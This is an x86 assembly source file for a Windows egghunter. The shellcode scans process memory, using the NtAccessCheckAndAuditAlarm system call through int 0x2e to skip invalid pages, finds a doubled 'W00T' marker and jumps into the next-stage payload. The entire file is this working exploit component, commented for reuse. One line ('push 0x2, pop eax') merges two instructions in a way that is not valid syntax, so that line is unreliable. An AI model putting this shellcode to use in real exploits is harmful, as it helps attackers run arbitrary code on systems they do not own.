section .data

section .bss

section .text

global _start

_start:

loop_inc_page:
  or dx, 0x0fff       ; Go to last address in page n (this could also be used to
                      ; XOR EDX and set the counter to 00000000)
loop_inc_one:
  inc edx             ; Go to first address in page n+1

loop_check:
  push edx            ; save edx which holds our current memory location
  push 0x2, pop eax   ; initialize the call to NtAccessCheckAndAuditAlarm
  int 0x2e            ; perform the system call
  cmp al,05           ; check for access violation, 0xc0000005 (ACCESS_VIOLATION)
  pop edx             ; restore edx to check later the content of pointed address

loop_check_8_valid:
  je loop_inc_page    ; if access violation encountered, go to next page

is_egg:
  mov eax, 0x57303054 ; load egg (W00T in this example)
  mov edi, edx        ; initializes pointer with current checked address
  scasd               ; Compare eax with doubleword at edi and set status flags
  jnz loop_inc_one    ; No match, we will increase our memory counter by one
  scasd               ; first part of the egg detected, check for the second part
  jnz loop_inc_one    ; No match, we found just a location with half an egg
matched:
  jmp edi             ;  edi points to the first byte of our 3rd stage code, let's go! 
